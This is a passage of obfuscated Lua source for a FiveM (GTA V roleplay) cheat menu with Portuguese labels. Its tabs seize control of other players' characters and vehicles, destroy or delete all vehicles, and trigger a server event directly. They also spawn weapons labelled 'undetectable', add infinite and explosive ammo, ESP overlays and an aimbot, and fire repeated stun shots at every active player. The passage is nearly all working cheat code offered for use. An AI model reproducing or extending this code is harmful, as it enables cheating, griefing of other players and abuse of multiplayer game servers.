                DrawMarker(42, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 220, 220, 120, admgordolas, vitolasRPMQCUeMEUCUzz, 2, vitolasRPMQCUeMEUCUss, vitolasRPMQCUeMEUCUss, admgordolas)
                
                for k in EnumerateVehicles() do
                SetEntityInvincible(k, vitolasRPMQCUeMEUCUzz)
                if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                RequestControlOnce(k)
                FreezeEntityPosition(k, admgordolas)
                Oscillate(k, Markerloc, 0.5, 0.3)
                end
                end
                
                for k in EnumeratePeds() do
                if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                RequestControlOnce(k)
                SetPedToRagdoll(k, 4000, 5000, 0, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
                FreezeEntityPosition(k, admgordolas)
                Oscillate(k, Markerloc, 0.5, 0.3)
                end
                end
                
                end
                
                end
                
                while ForceTog do forcetick()Wait(0) end
                end)
                else ShowInfo("Magneto ~r~[OFF]") end
                
                end




    
    elseif tab == "Lua" then


        
    elseif tab == "Veiculos" then
        vitolasRPMQCUeMEUCUuu(0.471,0.275,0.043,0.0015,255, 255, 255,255)
        --0.471
        --0.257
        if manacokkk("Fix",admgordolas,0.387,0.35) then

            SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))
            Citizen.InvokeNative(
                0x115722B1B9C14C1C,
                Citizen.InvokeNative(0x9A9112A0FE9A4713, Citizen.InvokeNative(0x43A66C31C68491C0, -1), admgordolas)
            )
            Citizen.InvokeNative(
                0x79D3B596FE44EE8B,
                Citizen.InvokeNative(0x9A9112A0FE9A4713, Citizen.InvokeNative(0x43A66C31C68491C0, -1), admgordolas),
                0.0
            )
            Citizen.InvokeNative(
                0x34E710FF01247C5A,
                Citizen.InvokeNative(0x9A9112A0FE9A4713, Citizen.InvokeNative(0x43A66C31C68491C0, -1), admgordolas),
                0
            )
            Citizen.InvokeNative(
                0xFB8794444A7D60FB,
                Citizen.InvokeNative(0x9A9112A0FE9A4713, Citizen.InvokeNative(0x43A66C31C68491C0, -1), admgordolas),
                admgordolas
            )
            Citizen.InvokeNative(
                0x1FD09E7390A74D54,
                Citizen.InvokeNative(0x9A9112A0FE9A4713, Citizen.InvokeNative(0x43A66C31C68491C0, -1), admgordolas),
                0
            )
        end
        


        if manacokkk("Tunagem Maxima",admgordolas,0.387,0.4) then
            engine(GetVehiclePedIsUsing(PlayerPedId()))
            engine1(GetVehiclePedIsUsing(PlayerPedId()))
            MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
        end      
        if manacokkk("Modificar Placa",admgordolas,0.5,0.35) then
            local playerPed = GetPlayerPed(-1)
            local playerVeh = GetVehiclePedIsIn(playerPed, vitolasRPMQCUeMEUCUzz)
            local result = KeyInput("~b~Coloque Placa Desejada", "", 10)
            if result then
                SetVehicleNumberPlateText(playerVeh, result)
            end
        end 

        
        if manacokkk("Destrancar",admgordolas,0.501,0.4) then
            
            DestrancarVeh()

        end 

        if manacokkk("Destroir Veiculos",admgordolas,0.501,0.45) then
            
            DestroyCarAll()

        end

        if manacokkk("Desmanchar Veiculos",admgordolas,0.501,0.50) then
            
            TriggerServerEvent("desmancheVehiclesruddy")

        end 

        if manacokkk("Kick Flip",admgordolas,0.501,0.55) then
            
            asjdighdfhgKickFlip_Veh()

        end 

        if manacokkk("Back Flip",admgordolas,0.501,0.60) then
            
            zkfkcngdgfhavrpBackFlip_Veh()

        end 

        if manacokkk("Pular com Veh",admgordolas,0.501,0.65) then
            
            asdfdsjdfgbdcmxcnbPular_Veh()

        end 


    if manacokkk("TP Carro Prox",admgordolas,0.615,0.50) then
        warp()
    end 

        if manacokkk("Car color",admgordolas,0.615,0.45) then
            h.ThisIsSliders[7].value, h.ThisIsSliders[8].value, h.ThisIsSliders[9].value = ColorPicker()
            SetVehicleCustomPrimaryColour(
                GetVehiclePedIsUsing(PlayerPedId(-1)),
                h.ThisIsSliders[7].value,
                h.ThisIsSliders[8].value,
                h.ThisIsSliders[9].value
            )
            SetVehicleCustomSecondaryColour(
                GetVehiclePedIsUsing(PlayerPedId(-1)),
                h.ThisIsSliders[7].value,
                h.ThisIsSliders[8].value,
                h.ThisIsSliders[9].value
            )
        end

        
        if manacokkk("Setar RG",admgordolas,0.615,0.35) then

            SetarRGVitolas()

        end

        if manacokkk("Spawn Carro",admgordolas,0.615,0.40) then
            
            spawnCarRP()

            end
        
        
        
        if boxzinha("Super veiculo",0.347,0.45,0.45,EasyHandling) then
            EasyHandling = not EasyHandling
            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
            if not EasyHandling then
                SetVehicleGravityAmount(veh, 9.8)
                SetVehicleForwardSpeed(playerVeh, 1.0)
            else
                SetVehicleGravityAmount(veh, 30.0)
            end
        end

        if boxzinha("Buzina Boost",0.347,0.47,0.47,buniza) then
            buniza = not buniza
        end

        if boxzinha("Nunca cair",0.347,0.49,0.49,veh_cair) then
            veh_cair = not veh_cair
            if veh_cair then
                SetPedCanBeKnockedOffVehicle(PlayerPedId(), vitolasRPMQCUeMEUCUzz)
                SetPedCanBeKnockedOffVehicle(PlayerPedId(), vitolasRPMQCUeMEUCUzz)
                SetPedCanBeKnockedOffVehicle(PlayerPedId(), vitolasRPMQCUeMEUCUzz)
            end
        end

        if boxzinha("Veiculo GodMode",0.347,0.51,0.51,autoreparar) then
            
            autoreparar = not autoreparar
        end

        if boxzinha("Veiculo ~r~R~g~G~b~B",0.347,0.53,0.53, VehicleRGB) then

            VehicleRGB = not VehicleRGB

        end

        if boxzinha("Veiculo Invisivel", 0.347,0.55,0.55, vehInv) then

            vehInv = not vehInv

        end

        if boxzinha("Deletar Veiculos",0.347,0.57,0.57, deletenearestvehicle) then
        
            deletenearestvehicle = not deletenearestvehicle
    
        end 

        if boxzinha("Colocar Todos~w~ Veiculos Pra Voar",0.347,0.59,0.59, FlyingCars) then
        
            FlyingCars = not FlyingCars

        end

    elseif tab == "Troll" then
    
     

        
        elseif tab == "Weapon" then


            

    elseif tab == "Visu" then
        vitolasRPMQCUeMEUCUuu(0.517,0.275,0.031,0.0015,255, 255, 255,255)
        --0.517
        --0.257

      
      
        if boxzinha("ESP Nomes",0.347,0.41, 0.41,espdepenis) then
            
            espdepenis = not espdepenis
        
        
        end

        if boxzinha("ESP Box",0.347,0.39, 0.39,box) then
            
        
        box = not box
        
        end 


        if boxzinha("ESP Skeleton",0.347,0.43, 0.43,espskel) then
            
        
            espskel = not espskel
            
        end 

        if boxzinha("ESP Veiculos",0.347,0.45, 0.45,espveiculo) then
            
        
            espveiculo = not espveiculo
            
        end
        
        if boxzinha("ESP's ~r~R~g~G~b~B",0.347,0.48, 0.48,esps_gaymerskkk) then
            
        
            esps_gaymerskkk = not esps_gaymerskkk
            
        end

        if manacokkk("Cor ESP Nomes", admgordolas,0.5,0.35) then

            h.ThisIsSliders[7].value, h.ThisIsSliders[8].value, h.ThisIsSliders[9].value = ColorPicker()
            esp_nome_cor = {r = h.ThisIsSliders[7].value, g = h.ThisIsSliders[8].value, b = h.ThisIsSliders[9].value}
        
        end


        if manacokkk("Cor ESP BOX", admgordolas,0.5,0.40) then

            h.ThisIsSliders[7].value, h.ThisIsSliders[8].value, h.ThisIsSliders[9].value = ColorPicker()
            esp_box_cor = {r = h.ThisIsSliders[7].value, g = h.ThisIsSliders[8].value, b = h.ThisIsSliders[9].value}
        
        end

        if manacokkk("Cor ESP Skeleton", admgordolas,0.5,0.45) then

            h.ThisIsSliders[7].value, h.ThisIsSliders[8].value, h.ThisIsSliders[9].value = ColorPicker()
            esp_skel_cor = {r = h.ThisIsSliders[7].value, g = h.ThisIsSliders[8].value, b = h.ThisIsSliders[9].value}
        
        end

        if manacokkk("Cor ESP Veiculos", admgordolas,0.5,0.50) then

            h.ThisIsSliders[7].value, h.ThisIsSliders[8].value, h.ThisIsSliders[9].value = ColorPicker()
            esp_veiculo_cor = {r = h.ThisIsSliders[7].value, g = h.ThisIsSliders[8].value, b = h.ThisIsSliders[9].value}
        
        end

        if manacokkk("Distancia Dos ESP's\n\n~p~Distancia Atual: ~r~"..visuals_distance.value.."",admgordolas,0.615,0.35) then

            local vsfd = KeyInput("~w~Distancia", "", 3)
            visuals_distance = {value = vsfd}

        end

        if manacokkk("Tela Morte SANTAGROUP", admgordolas, 0.615,0.45) then

            TriggerEvent("allcity_deadscreen:openclose",false) 
            
        end

    elseif tab == "Armas" then
        vitolasRPMQCUeMEUCUuu(0.423,0.275,0.035,0.0015,255, 255, 255,255)
        --0.423
        --0.257
        if manacokkk("Puxar Arma",admgordolas,0.387,0.65) then
            local ARMA = KeyInput("~b~Nome da Arma", "WEAPON_", 25)
            GiveWeaponToPed(PlayerPedId(), vitolasRPMQCUeMEUCUff(ARMA), 250, admgordolas, admgordolas)
        end
        


    --    if manacokkk("Extra ~y~Clip",admgordolas,0.387,0.4) then

         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xED265A1C)
       --     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD67B4F2D)
     --       GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x249A17D5)
   --         GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD9D3AC92)
            --GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7B0033B3)
          --  GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x64F9C62B)
        --    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xCE8C0772)
      --      GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x5ED6C128)
    --        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x33BA12E8)
  --          GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x81786CA9)
            --GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x10E6BA2B)
           -- GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x350966FB)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xBB46E417)
       --     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x937ED0B7)
     --       GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xB9835B2E)
   --         GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xB92C6979)
 --           GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x334A5203)
          --  GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x86BD7F72)
        --    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x971CF6FD)
       --     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xB1214F9B)
       --     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x91109691)
       --     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x8EC1C979)
     --       GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7C8BD10E)
      --      GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xB3688B0F)
        --    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xEFB00628)
      --      GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xDE1FA12C)
       --     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD12ACA6F)
        --    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x5DD5DBD5)
        --    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x59FF9BF8)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x684ACE42)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x82158B47)
        --    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD6C59CD6)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x17DF42E9)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xEAC8C270)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE6CFD1AA)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x2CD8FF9D)
         --   GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xCCFD2AC5)

        
     --   end      
        if manacokkk("Remover Armas",admgordolas,0.5,0.70) then

            StripPlayer(PlayerId())

        end 

        if manacokkk("Fuzil Indetectável",admgordolas,0.615,0.65) then
            GiveWeaponToPed(
                PlayerPedId(),
                vitolasRPMQCUeMEUCUff("WEAPON_CARBINERIFLE"),
                250,
                admgordolas,
                admgordolas)
        end

        if manacokkk("Aimbot FOV\n\n~p~Tamanho Atual: ~r~"..visuals_aimlock.value.."",admgordolas, 0.615,0.35) then
            local fovapelao = KeyInput("~w~Tamanho Do FOV (0.01 - 9.9) - (Recommend: 0.08)", "", 4)
            visuals_aimlock = 0.5

        end

        if manacokkk("Refil Munição",admgordolas,0.501,0.35) then

            GiveMaxAmmo(PlayerId())
            
        end

        if manacokkk("Munição Infinita",admgordolas,0.501,0.40) then
            InfAmmo = not InfAmmo
        SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)

        end
        
        if manacokkk("Fuzil Indetectável²",admgordolas,0.387,0.70) then
            GiveWeaponToPed(
                PlayerPedId(),
                vitolasRPMQCUeMEUCUff("WEAPON_ASSAULTRIFLE"),
                250,
                admgordolas,
                admgordolas)
        end 

        if manacokkk("Shotgun Indetectável ",admgordolas,0.615,0.70) then
            GiveWeaponToPed(PlayerPedId(), vitolasRPMQCUeMEUCUff("WEAPON_COMBATSHOTGUN"), 250, admgordolas, admgordolas)
        end 

        if manacokkk("Pistola Indetectável",admgordolas,0.501,0.65) then
            GiveWeaponToPed(PlayerPedId(), vitolasRPMQCUeMEUCUff("WEAPON_PISTOL_MK2"), 250, admgordolas, admgordolas)
        end

        if boxzinha("Munição Explosiva",0.347,0.45,0.45,munizinha) then
            munizinha = not munizinha

    end

    if boxzinha("Munição De impulso",0.347,0.47,0.47,munizinhadeshock) then
        munizinhadeshock = not munizinhadeshock

end

        if boxzinha("Munição Infinita+No reload",0.347,0.49,0.49,muni) then
            muni = not muni

            SetPedInfiniteAmmoClip(PlayerPedId(), muni)

        end

        if boxzinha("aimlock",0.347,0.51,0.51, aimlock) then

            aimlock = not aimlock

        end

    end
        

        


        -- General --
        
        
    if tab == "Misc" then
        vitolasRPMQCUeMEUCUuu(0.555,0.275,0.027,0.0015,255, 255, 255,255)
        --0.555
        --0.257
        vitolasRPMQCUeMEUCUyy("~b~» ~w~Roupas:",0.373,0.32,vitolasRPMQCUeMEUCUzz,0.2,10,admgordolas)
        if manacokkk("Roupa Legit¹",admgordolas,0.387,0.35) then
            resetAppearance()
            changeAppearance('CHAPEU', 67, 0)
            changeAppearance('MAOS', 0, 0)
            changeAppearance('CAMISA', 151, 0)
            changeAppearance('JAQUETA', 0, 0)
            changeAppearance('CALCA', 28, 0)
            changeAppearance('SAPATO', 2, 0)
            changeAppearance('MASCARA', 11, 0)
            changeAppearance('OCULOS', 15, 0)
                end
        
        if manacokkk("Roupa Legit²",admgordolas,0.387,0.40) then
            changeAppearance('MAOS', 1, 1)
            a0("HATS", 132,0 )

            changeAppearance('CAMISA', 0, 0)
            changeAppearance('JAQUETA', 208, 0)
            changeAppearance('CALCA', 26, 6)
            changeAppearance('SAPATO', 6, 0)
            changeAppearance('MASCARA', 0, 0)
            changeAppearance('SPECIAL2', 15, 0)
            

        
        end 
        
        if manacokkk("Adm",admgordolas,0.387,0.45) then


            changeAppearance('MAOS', 1, 1)
            a0("HATS", 0,0 )

            changeAppearance('CAMISA', 15, 0)
            changeAppearance('JAQUETA', 15, 0)
            changeAppearance('CALCA', 54, 0)
            changeAppearance('SAPATO', 34, 0)
            changeAppearance('MASCARA', 100, 0)
            changeAppearance('SPECIAL2', 15, 0)
            

        
        end 
        if manacokkk("Juggernaut",admgordolas,0.387,0.50) then

            local model = "u_m_y_juggernaut_01"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end

        if manacokkk("Homem",admgordolas,0.387,0.55) then
            resetAppearancee()
            resetAppearance()
            local model = "mp_m_freemode_01"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
                resetAppearancee()
            end
        end

        if manacokkk("Setar ~r~S~g~K~o~I~b~N ~w~Name",admgordolas,0.387,0.60) then
            local model = KeyInput("Enter Model Name", "", 50)
                    RequestModel(GetHashKey(model))
                    print(model)
                    Wait(0)
                    if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    else 
                        ShowInfo("~r~~h~Modelo Inválido!!") 
                end
            end


        vitolasRPMQCUeMEUCUyy("~b~» ~w~Skins:",0.487,0.32,vitolasRPMQCUeMEUCUzz,0.2,10,admgordolas)

        if manacokkk("Mãe do ADM",admgordolas,0.5,0.35) then
            local model = "a_f_m_fatcult_01"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end
        
        if manacokkk("E.T",admgordolas,0.5,0.40) then
            local model = "s_m_m_movalien_01"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end
        
        if manacokkk("Super xandao",admgordolas,0.5,0.45) then
            local model = "u_m_y_babyd"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end

        if manacokkk("Super AntiRP",admgordolas,0.5,0.50) then
            local model = "u_m_y_imporage"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end 

        if manacokkk("Astronalta",admgordolas,0.5,0.55) then
            local model = "s_m_m_movspace_01"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end 

        if manacokkk("Jesus",admgordolas,0.5,0.60) then
            local model = "u_m_m_jesus_01"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end 

        vitolasRPMQCUeMEUCUyy("~b~» ~w~Animais:",0.601,0.32,vitolasRPMQCUeMEUCUzz,0.2,10,admgordolas)
        if manacokkk("Macaco",admgordolas,0.615,0.35) then
            local model = "a_c_chimp"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end
        
        if manacokkk("Cachorro",admgordolas,0.615,0.40) then
            local model = "a_c_pug"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end
        
        if manacokkk("Galinha",admgordolas,0.615,0.45) then
            local model = "a_c_hen"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end
        if manacokkk("Vaca",admgordolas,0.615,0.50) then
            local model = "a_c_cow"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end

        if manacokkk("Rato",admgordolas,0.615,0.55) then
            local model = "a_c_rat"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end 

        if manacokkk("Peppa Pig",admgordolas,0.615,0.60) then
            local model = "a_c_pig"
            RequestModel(vitolasRPMQCUeMEUCUff(model))
            vitolasRPMQCUeMEUCUtt(1)
            if HasModelLoaded(vitolasRPMQCUeMEUCUff(model)) then
                SetPlayerModel(PlayerId(), vitolasRPMQCUeMEUCUff(model))
            end
        end 

    elseif tab == "Config" then

        vitolasRPMQCUeMEUCUuu(0.625,0.275,0.039,0.0015,0, 0, 255,255)

        if manacokkk("Bind Menu ~c~»  ~w~" .. MQCUumaBOSTA["Label"], false, 0.387,0.35,admgordolas) then

            BindDoMenu()
            local value, label = BindDoMenu()
            MQCUumaBOSTA["Label"] = label
            MQCUumaBOSTA["Value"] = value

        end

        if manacokkk("Bind Noclip ~c~»  ~w~" .. noclip["Label"], false, 0.387,0.40,admgordolas) then

            BindDoMenu()
            local value, label = BindDoMenu()
            noclip["Label"] = label
            noclip["Value"] = value

        end


    elseif tab == "Players" then

        vitolasRPMQCUeMEUCUuu(0.595,0.275,0.039,0.0015,0, 0, 255,255)




    if manacokkk("",admgordolas,0.387,0.35) then
    end

        if Subbutao("slamn", "Jogadores Online »",vitolasRPMQCUeMEUCUzz,0.387,0.349) then
            tab = "slamn"
        
        end
    
    

        if manacokkk("Matar geral",admgordolas,0.490,0.65) then
        SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, true, true, false)
        ClearPedTasks(PlayerPedId())
        for o, p in pairs(GetActivePlayers()) do
            local S = GetPlayerPed(p)
            local dW = GetEntityCoords(S)
            local dX = GetPedBoneCoords(S, 0, 0.0, 0.0, 0.0)
            local dY = GetPedBoneCoords(S, 57005, 0.0, 0.0, 0.2)
            if S ~= PlayerPedId() and not IsPedDeadOrDying(S) then
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                ShootSingleBulletBetweenCoords(
                    dY,
                    dX,
                    1,
                    true,
                    GetHashKey("WEAPON_STUNGUN"),
                    PlayerPedId(p),
                    true,
                    false,
                    1.0
                )
                Citizen.Wait(100)
            end
        end
    end
    if manacokkk("Tazer all",admgordolas,0.490,0.60) then
        SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, true, true, false)
